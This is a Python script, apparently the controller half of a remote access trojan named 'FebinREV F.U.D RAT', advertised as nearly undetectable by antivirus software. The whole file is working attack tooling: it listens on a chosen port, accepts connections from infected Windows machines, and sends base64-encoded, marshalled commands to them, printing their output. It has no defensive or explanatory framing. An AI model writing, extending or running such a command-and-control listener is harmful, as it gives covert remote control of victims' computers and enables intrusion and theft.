import sys
def fr_listener():
    print("FebinREV F.U.D RAT for Windows..Almost undetectable by all Antiviruses")
    print("""\033[1;34m
    ╔═╗╔═╗╔╗ ╦═╗╔═╗╦  ╦   ┌─┐┬ ┬╦═╗╔═╗╔╦╗
    ╠╣ ║╣ ╠╩╗╠╦╝║╣ ╚╗╔╝───├─┘└┬┘╠╦╝╠═╣ ║ 
    ╚  ╚═╝╚═╝╩╚═╚═╝ ╚╝    ┴   ┴ ╩╚═╩ ╩ ╩    -- coded by FEBIN""")
    print("""\033[1;32m +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |r|e|m|o|t|e|-|c|o|m|m|a|n|d|-|p|r|o|m|p|t|
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    """)
    print("listening for incoming connections.........")
    import socket
    import marshal
    import base64
    lport=int(input("ENTER THE PORT YOU USED IN PAYLOAD : "))
    print(f"listening on {lport} for client connection")
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind((socket.gethostname(),lport))
    s.listen(5)
    while True:
        clt,adr=s.accept()
        listener=input("febrev-remoteCMD>>$")
        maren=marshal.dumps(listener)
        basen=base64.b64encode(maren)
        clt.send(basen)
        repl=clt.recv(2048)
        print(repl.decode("utf-8"))
    
if __name__=="__main__":
    try:
        fr_listener()
    except KeyboardInterrupt:
        print("!!!SERVER STOPPED .... CONNECTION CLOSED!!!!")
        sys.exit()
